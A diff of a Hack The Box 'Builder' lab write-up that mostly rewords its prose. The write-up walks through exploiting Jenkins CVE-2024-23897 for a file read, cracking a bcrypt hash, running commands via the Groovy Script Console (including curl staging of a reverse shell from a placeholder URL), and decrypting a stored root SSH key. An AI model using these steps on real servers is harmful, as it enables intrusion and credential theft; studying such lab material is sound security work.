@@ -33,7 +33,7 @@ outcome: "Root SSH access using a private key decrypted from the Jenkins credent
 
 ## CLI file read to credential-store root
 
-Builder is a Medium-rated Hack The Box Linux lab centred on a Jenkins CI/CD server affected by CVE-2024-23897. An unauthenticated file read in the Jenkins CLI exposes the user index and a per-user configuration file, yielding a bcrypt password hash; offline recovery enables authentication, the Groovy Script Console then provides operating-system command execution as the Jenkins service account, and a root SSH private key held in the Jenkins credential store is decrypted through Jenkins' own secret API. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/). The private key and payload specifics are omitted.
+Builder is a Medium-rated Hack The Box Linux lab centred on a Jenkins CI/CD server affected by CVE-2024-23897. An unauthenticated file read in the Jenkins CLI exposes the user index and a per-user configuration file and yields a bcrypt password hash; offline recovery enables authentication, the Groovy Script Console then provides operating-system command execution as the Jenkins service account, and a root SSH private key held in the Jenkins credential store is decrypted through Jenkins' own secret API. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/). The private key and payload specifics are omitted.
 
 **Attack path:** **Unauthenticated Jenkins CLI `@` file read (CVE-2024-23897) → users index → per-user `config.xml` → bcrypt password hash → offline recovery → Jenkins authentication → Script Console execution as `jenkins` → `credentials.xml` root SSH key → `hudson.util.Secret` decryption → root SSH access**
 
@@ -66,7 +66,7 @@ Truncated scan output:
 
 Significance: the dashboard title identifies a Jenkins instance, and the running version determines which Jenkins CLI behaviours apply to it.
 
-Result: Jenkins 2.441 is identified from the HTTP response headers and the login page, alongside OpenSSH on the host.
+Result: I checked the HTTP response headers and the login page, which identify Jenkins 2.441 alongside OpenSSH on the host.
 
 ### 2. Unauthenticated Jenkins CLI File Read (CVE-2024-23897)
 
@@ -82,7 +82,7 @@ Truncated output:
 <string><JENKINS_USER_DIR></string>
 ```
 
-The directory identifier is then used to request that user's configuration file:
+I then requested that user's configuration file using the directory identifier:
 
 ```bash
 java -jar <JENKINS_CLI_JAR> -s http://<TARGET_IP>:8080 help "@/var/jenkins_home/users/<JENKINS_USER_DIR>/config.xml" 2>&1
@@ -98,7 +98,7 @@ Result: the user index and a per-user `config.xml` are read, and a bcrypt passwo
 
 ### 3. Offline Password Recovery
 
-Observation: the recovered value is a bcrypt hash, so it must be cracked offline rather than used directly.
+Observation: the recovered value is a bcrypt hash, so it must be cracked offline before it can be used.
 
 ```bash
 hashcat -m 3200 <HASH_FILE> <WORDLIST>
@@ -114,7 +114,7 @@ Result: the account password is recovered offline.
 
 ### 4. Jenkins Authentication and Script Console Execution
 
-Observation: the Groovy Script Console executes arbitrary code with the permissions of the Jenkins process. The source records that the recovered password authenticated successfully; no separate login transcript was retained.
+Observation: the Groovy Script Console executes arbitrary code with the permissions of the Jenkins process. The source records that the recovered password authenticated successfully; it retained no separate login transcript.
 
 ```groovy
 println "id".execute().text
@@ -124,7 +124,7 @@ println "id".execute().text
 uid=1000(jenkins) gid=1000(jenkins)
 ```
 
-The console is also used to stage a reverse shell, preserved here only as placeholder patterns:
+The console also staged a reverse shell, preserved here only as placeholder patterns:
 
 ```groovy
 println "curl -o <LOCAL_STAGING_PATH> <REMOTE_URL>".execute().text
@@ -137,7 +137,7 @@ Result: the `id` output establishes operating-system command execution as the `j
 
 ### 5. Credential-Store Privilege Escalation
 
-Observation: the Jenkins home directory contains `credentials.xml`, holding an encrypted SSH private key configured for the root user.
+Observation: the Jenkins home directory contains `credentials.xml` with an encrypted SSH private key configured for the root user.
 
 ```bash
 cat /var/jenkins_home/credentials.xml
@@ -179,13 +179,13 @@ Result: a root SSH private key is decrypted and used to obtain a root shell on t
 | Challenge | Decision | Rationale |
 |---|---|---|
 | The per-user configuration path is not known up front | Read `/var/jenkins_home/users/users.xml` first, then request that directory's `config.xml` | The `@` argument reads a fixed path, so the users index supplies the per-user directory component |
-| The stored SSH key is encrypted by Jenkins' own mechanism | Decrypt with `hudson.util.Secret` from the Script Console | The value is protected by the application's credential encryption, so its API unwraps it directly |
+| Jenkins encrypts the stored SSH key with its own mechanism | Decrypt with `hudson.util.Secret` from the Script Console | The application's credential encryption protects the value, so its API unwraps it directly |
 
 ## Outcome: service shell and root from stored key
 
-The evidence establishes unauthenticated file read through the Jenkins CLI, authenticated code execution as the `jenkins` service account, and root access obtained with a private key decrypted from the Jenkins credential store. The material weakness is the combination of an unauthenticated disclosure primitive, an administrative console, and a credential store holding a root key; CVE-2024-23897 is the only software vulnerability in the path.
+The evidence establishes unauthenticated file read through the Jenkins CLI, authenticated code execution as the `jenkins` service account, and root access obtained with a private key decrypted from the Jenkins credential store. The material weakness is the combination of an unauthenticated disclosure primitive, an administrative console, and a credential store that holds a root key; CVE-2024-23897 is the only software vulnerability in the path.
 
-Limitations: the credential material is not reproducible from this writeup.
+Limitations: the credential material is not reproducible from this writeup, and I could not verify the login independently.
 
 ## Recommendations: CLI read, Script Console, and stored key
 
